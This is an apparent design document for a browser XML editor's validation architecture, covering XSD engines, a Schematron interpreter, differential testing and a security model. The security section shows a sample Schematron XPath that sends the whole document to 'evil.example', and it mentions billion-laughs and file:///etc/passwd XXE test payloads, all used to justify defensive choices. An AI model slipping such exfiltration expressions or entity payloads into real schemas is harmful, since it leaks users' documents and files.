# Validation architecture and security model

> Companion to [`../PLAN.md`](../PLAN.md). Covers the two authoritative validators, how their findings
> reach a tree node, and why running someone else's schema is a security decision.

## 1. Three validators, one diagnostic type

| Layer | Engine | Runs |
|---|---|---|
| Well-formedness | `saxes`, during parse | synchronously, on every parse |
| XSD | libxml2 via WASM | worker, debounced ~150ms |
| Schematron | our fontoxpath interpreter | worker, debounced, on idle for full passes |

All three emit the same `Diagnostic` shape (see
[`schema-engine.md` §5](schema-engine.md#5-diagnostics)), so the Problems panel, the tree badges and
the "Why is this invalid?" explainer have exactly one thing to render.

A fourth, non-authoritative source — the guidance engine — produces the live amber/red badging while
you type. It is explicitly *advisory* and is continuously cross-checked against libxml2 in CI (§4).

## 2. XSD validation

### 2.1 Engine choice

**`libxml2-wasm` (MIT, v0.7.1) primary; `xmllint-wasm` (MIT) as a named fallback**, both behind:

```ts
interface XsdEngine {
  compile(sources: SchemaSource[]): Promise<CompiledSchemaHandle>;
  validate(handle: CompiledSchemaHandle, text: string): Promise<RawValidationError[]>;
  dispose(handle: CompiledSchemaHandle): void;
}
```

Same underlying C library, so switching is a driver swap rather than a rewrite.

`libxml2-wasm` is preferred because it exposes a **reusable compiled-schema handle**:

```ts
import { XmlDocument, XsdValidator } from 'libxml2-wasm';

const schema    = XmlDocument.fromString(schemaText);
const validator = XsdValidator.fromDoc(schema);   // compile once
validator.validate(doc);                          // reuse per keystroke
```

Schema compilation (`xmlSchemaParse`) dominates cost in an interactive edit loop, so caching the
compiled handle per schema set is the difference between a responsive editor and an unusable one.

Both objects own native memory and **must be explicitly disposed** — a leak here is a wasm heap OOM,
not a GC pause. Ownership lives entirely in the worker, one handle per schema set, disposed on schema
change.

> **SPIKE-1.** The documentation does not say whether `validate()` reports *all* errors or throws on
> the first, nor whether errors carry line numbers. This materially affects the UX — a Problems panel
> that shows one error at a time is much worse. Test with a document containing 5 distinct errors
> before committing. `xmllint-wasm`'s CLI-shaped output does list all errors, which is the fallback.

### 2.2 XSD 1.1 is in scope, and libxml2 cannot reach it

libxml2 implements **XML Schema 1.0** only; the maintainer has stated 1.1 is not planned. Missing:
`xs:assert`, `xs:alternative` (conditional type assignment), `openContent`, `xs:override`.

Since 1.1 is a confirmed requirement, libxml2 is therefore **demoted from authoritative validator to
fast differential oracle for the 1.0 subset**. There is no JavaScript alternative — no XSD 1.1
validator exists in JS at all, in the browser or in Node. Saxon-EE implements 1.1 properly and is a
commercial per-seat Java product with no browser story.

That leaves the three-layer arrangement in [`../PLAN.md` §5.1](../PLAN.md#51-xsd--our-engine-targets-11-two-oracles-check-it):

1. **Our engine is the primary verdict** for both 1.0 and 1.1. This is less alarming than it sounds,
   because we were always writing it — the guidance requirement forced that regardless — and the two
   headline 1.1 features are XPath-shaped. `xs:assert` *is* an XPath 2.0 expression; `xs:alternative`
   is an XPath predicate selecting a type. **fontoxpath is already a mandatory dependency**, so
   assertions cost us an evaluation context, not an engine.
2. **`libxml2-wasm`** stays as the fast oracle for 1.0 schemas, which is still most of the real world.
3. **`xmlschema` (MIT, v4.3.2)** is the authoritative 1.1 oracle. It is pure Python — its only
   dependency, `elementpath`, is also pure Python — so micropip installs it under Pyodide with nothing
   to cross-compile. In the browser it loads lazily in its own worker behind an explicit "full
   conformance check" action, never on the critical path, because Pyodide is ~6–10MB. In CI it runs
   under plain CPython and costs nothing.

Two sharp edges to handle explicitly:

- **A 1.1-legal schema can be UPA-invalid under 1.0**, because 1.1 relaxed Unique Particle
  Attribution. So libxml2 rejecting a 1.1 schema is expected behaviour, not a finding. The
  differential harness must dispatch on the schema's declared version and pick its oracle
  accordingly, or 1.1 schemas produce a flood of false failures.
- **Version detection** comes from `vc:minVersion`/`vc:maxVersion` attributes and from the presence of
  1.1-only constructs. When a schema is ambiguous, prefer 1.1 (it is the superset) and say which
  version was assumed.

Schematron does not become redundant. Co-occurrence rules are frequently *more* readable as Schematron
asserts with human-authored messages than as `xs:assert`, and those messages are what give the
Problems panel its plain English — an `xs:assert` failure can only ever say "an assertion failed".

### 2.3 Multi-file schemas — resolve the graph ourselves

`libxml2-wasm` flags `xs:include`/`xs:import` support as **experimental**, and there is a second,
worse problem: **libxml2 will happily compile a schema with unresolved imports and then validate
against the partial model, silently under-reporting errors.** That is a correctness failure that looks
like success.

So we resolve the schema graph in JavaScript *before* calling into WASM:

1. Walk the `import`/`include`/`redefine` closure from the root schema.
2. Resolve every `schemaLocation` through the in-app catalogue, in order: **bundled well-known schemas
   → workspace files → user-supplied OASIS XML Catalog → (optionally, with consent) network**.
3. Rewrite each `schemaLocation` to a flat, deterministic filename.
4. Materialise the whole closure into the WASM virtual filesystem.
5. **Assert the closure is complete.** Any unresolved import is a hard error surfaced to the user —
   "this schema imports `http://example.com/common.xsd`, which isn't available" with a button to
   supply it — never a silent partial validation.

libxml2 never attempts a fetch of its own (§5). This is **SPIKE-2**: verify against UBL 2.1, which has
many files and deep imports, and diff against command-line `xmllint`.

### 2.4 Error → node mapping: own the serializer

The naive approach — parse libxml2's line/column and search the tree — is fragile, and libxml2 often
reports column `0` for schema errors anyway.

Instead, **control the text libxml2 sees**. The worker serialises for validation using a mode that
emits **exactly one element start-tag per line**, and returns a parallel array:

```ts
interface ValidationPayload {
  text: string;
  lineMap: NodeId[];   // lineMap[lineNumber] → the NodeId whose start-tag is on that line
}
```

"Error at line 42" becomes `lineMap[42]` — an O(1) exact lookup. Column numbers become irrelevant.

This serialisation is *only* for validation and is never written to disk, so it does not conflict with
the lossless splice serializer used for saving (PLAN.md §4.1).

> **Rejected alternative:** injecting tracking attributes into the document before validation. It
> looks correct in a prototype and then fails against any strict schema with
> `cvc-complex-type.3.2.2` — the injected attributes are themselves invalid.

### 2.5 Cancellation and staleness

Every request carries a monotonically increasing `revision`. Results tagged with a superseded revision
are discarded. Long-running validations are cancelled by **terminating and respawning the worker**,
which is why the protocol is hand-rolled rather than Comlink — a transparent proxy hides exactly the
lifecycle control we need.

While a revision is in flight, previous results render **dimmed rather than cleared**, so the UI never
flickers through a misleading "no problems" state mid-edit.

## 3. Schematron validation

### 3.1 Why not XSLT — the decision, with its expiry date

Classical Schematron is an XSLT pipeline: `include` → `abstract-expand` → compile to XSLT → run →
SVRL. Every step needs an XSLT engine in the browser. That option is closing:

- **Chrome removes XSLT entirely in v158, 17 November 2026** — the `XSLTProcessor` API and the
  `xml-stylesheet` PI both. Deprecation warnings started in Chrome 143; Canary/Dev/Beta have had it
  off by default since 145. **Firefox and WebKit have both signalled they will follow.** The stated
  reason is that libxslt is an aging C codebase with memory-safety vulnerabilities.
- The remaining browser XSLT 3.0 engine, **SaxonJS 2, is free of charge but proprietary and not open
  source.** This is an easy trap: "free" reads as "open source", and it becomes a licence problem only
  when someone tries to sell the product. (One common misconception *is* wrong, and worth recording:
  producing a SEF file does **not** require the commercial Saxon-EE Java product — SaxonJS 2's Node
  package `xslt3` includes a compiler. The licence issue is with SaxonJS itself, not the toolchain.)

### 3.2 The decision: a direct interpreter over fontoxpath

**Start from `node-schematron` (MIT, v2.1.0)** — already exactly this design, built on `fontoxpath` +
`slimdom`, and explicitly targeting "Node, browsers and CLI". Fork or vendor it and extend where gaps
exist (`sch:include`, abstract rules/patterns, diagnostics, phases).

Four independent reasons this is better rather than merely safer:

1. **No XSLT engine at all**, so nothing breaks in November 2026.
2. **fontoxpath is a mandatory dependency regardless.** A Schematron *editor* has to evaluate XPath
   live for autocomplete, "what does this context match", and per-rule testing (§3.5). So the
   interpreter's marginal cost is about one module; SaxonJS would be pure additional cost.
3. **Findings bind to nodes by identity.** We hold the actual node object when an assert fails. The
   SVRL route returns a `@location` XPath *string* that must then be re-resolved against the tree.
4. **Per-rule statistics are possible** — fire counts, shadowing detection, per-assertion pass/fail —
   which is the best beginner feature in the whole Schematron mode, and is impossible through a
   compiled SVRL pipeline.

Via fontoxpath's **`IDomFacade`**, our own CST *is* the XPath data model. No second DOM, no sync
problem, no serialisation round-trip.

```ts
const facade: IDomFacade = {
  getFirstChild, getNextSibling, getParentNode,
  getAttributes, getData, /* … */
};
evaluateXPathToNodes(rule.context, contextNode, facade, variables, options);
```

### 3.3 Semantics to get right

- **First-match-wins per context node.** Within a pattern, a node is claimed by the first rule whose
  context matches it; later rules do not fire. This is the semantic beginners trip over most, hence
  the shadowing detector (§3.5).
- **`@context` is an XSLT *match pattern*, not an XPath expression.** The conversion — prefixing
  `descendant-or-self::node()/` unless it starts with `/` — is correct for essentially all real-world
  contexts but diverges on predicates in certain positions. Document the approximation and test it.
- **`sch:let`** variables, scoped per rule and per pattern.
- **Abstract patterns and rules**, `sch:extends`, `sch:include`.
- **Phases**, `sch:diagnostics`, `@role`/`@flag` severity mapping.
- **`sch:value-of` and `sch:name`** interpolation inside messages.
- **`queryBinding`**: support `xpath2`/`xpath3`/`xpath31` and the common `xslt2` subset. Note the
  semantic drift when running an `xslt` (XPath 1.0) schema under 3.1 — general comparisons stay
  existential, but untyped string-vs-number comparisons differ. Warn on `queryBinding="xslt"`.
- **`fn:doc()`** is not available by default and real-world Schematron does use `document()` to pull in
  code lists. Plan an explicit, consent-gated resource-resolver injection (§5).

### 3.4 The accepted limitation

Schemas embedding **foreign XSLT** — `xsl:function`, `xsl:key`, `xsl:template`, EXSLT — cannot run on
this interpreter. Some real healthcare and DITA Schematron does use these.

**Detect and refuse explicitly**, with a clear "this schema needs a full XSLT engine and can't be run
here" message naming the offending construct. Silently mis-validating is far worse than declining.

### 3.5 Live rule testing — the killer beginner feature

Bound to a sample instance document open in another tab, updating as you type:

| Signal | What it shows |
|---|---|
| Context match count | "this context matches **14 nodes**" |
| Fire count per rule | how many nodes each rule actually claimed |
| **Shadowing detection** | "rule 2 never fires — rule 1 claims all its nodes first" |
| Per-assertion pass/fail | clickable lists resolving to nodes in the instance tab |
| Message preview | `sch:value-of` interpolated against a real node |

This is what turns Schematron from an expert-only format into something a beginner can iterate on, and
it exists *because* we chose the interpreter over the compiled pipeline.

### 3.6 Performance

Naive evaluation is O(patterns × rules × nodes). Mitigate with a compiled-expression cache keyed on
`(expression, namespaceBindings)` using fontoxpath's `compileXPathToJavaScript`, and evaluate patterns
in a single document walk rather than one traversal per rule.

## 4. Differential testing — the anti-drift harness

The guidance engine and the authoritative validators are independent implementations. Disagreement
means the product **teaches beginners wrong things**, which is worse than being merely buggy.

| Target | Oracle | Corpus |
|---|---|---|
| Guidance engine's `whatCanGoHere` | a naive backtracking reference matcher | property-generated random particle trees (fast-check) |
| Our XSD 1.0 verdicts | `libxml2-wasm` | W3C XML Schema Test Collection 1.0 (~30k cases) + UBL 2.1, GML 3.2, HL7 CDA, DocBook, SEPA pain.001 |
| Our XSD 1.1 verdicts | `xmlschema` under CPython | W3C XML Schema 1.1 test set + schemas using `xs:assert`, `xs:alternative`, `openContent` |
| Our Schematron findings | **SchXslt2 (MIT) + `xslt3` under Node** | SchXslt's own test suite + the ISO reference cases |

SchXslt2 is CI-only and never shipped to the browser. It targets **ISO/IEC 19757-3:2025 (Edition 4,
published September 2025)**, and covers all but one feature of it — so our interpreter should target
the same edition rather than the older 2016/2020 texts.

**Publish the pass rate.** A number in CI output is the only thing that stops "the engine works" from
quietly becoming untrue.

## 5. Security

Client-side execution is not a security property. Three exposures:

### 5.1 A `.sch` someone emailed you is executable code

Classical Schematron compiles to XSLT, which is Turing-complete and has `fn:doc()`,
`fn:unparsed-text()` and `xsl:result-document`. A malicious rule can do:

```xpath
doc(concat('https://evil.example/', encode-for-uri(string(/))))
```

…exfiltrating the entire document from inside the user's browser, with the user's network position and
cookies. The same applies to Schematron **embedded in `xs:appinfo`**, which the user never consciously
chose to run.

**Our fontoxpath interpreter is safe by construction**: fontoxpath has no `fn:doc()` unless you supply
a resolver, and no filesystem or network access at all. This is a second, independent justification for
§3.2.

If a resource resolver is ever added for `document()` support, it must be consent-gated per-URL and
restricted to the catalogue, never a general `fetch`.

Should XSLT execution ever become necessary despite all of the above, the only acceptable shape is a
**null-origin sandboxed iframe** (`sandbox="allow-scripts"`, *without* `allow-same-origin`) under
`Content-Security-Policy: default-src 'none'`, communicating by `postMessage`, with a Playwright test
asserting **zero network egress during validation**.

### 5.2 libxml2 entity and network exposure

Named flag policy, asserted by unit test:

- **Always:** `XML_PARSE_NONET`
- **Never:** `NOENT`, `DTDLOAD`, `DTDATTR`, `XINCLUDE`, `HUGE`

`XML_PARSE_NOENT` expands external entities (XXE); `DTDLOAD` fetches them; if the Emscripten build
wires input callbacks to `fetch`, XXE becomes a live SSRF and exfiltration channel. libxml2 has an
entity-amplification check against billion-laughs, but it is **disabled by `XML_PARSE_HUGE`** — which
is exactly the flag someone turns on the first time a large document fails to parse.

`tests/security/entity-bombs.spec.ts` feeds the classic billion-laughs payload and a
`file:///etc/passwd` XXE payload and asserts failure. Independently, our own parser enforces a max
entity expansion factor, max nesting depth (default 256) and max total expanded bytes.

### 5.3 Never auto-fetch a remote schema

`xsi:schemaLocation`, `xsi:noNamespaceSchemaLocation` and `xs:import/@schemaLocation` pointing at
`http://…` are **never** fetched automatically. The user sees "this document asks to load a schema
from `evil.example` — fetch it?" with the full URL.

This is a named rule in the plan precisely because it is the most likely place someone adds a
convenience `fetch()` six months in.

### 5.4 One resolver, one choke point

`src/io/resolver.ts` is the single entry point for all resource resolution. It serves only buffers
already present in the in-app catalogue; every other URI returns "not found". **There is no `fetch`
call anywhere in the validation path**, which makes the guarantee reviewable in one file rather than
auditable across a codebase.

### 5.5 Privacy

No telemetry in v1, and the plan says so plainly. This is a promise that is actually enforceable,
because there is no server to send anything to — the optional CORS proxy exists solely to fetch
*schemas the user explicitly asked for* and never sees document content.
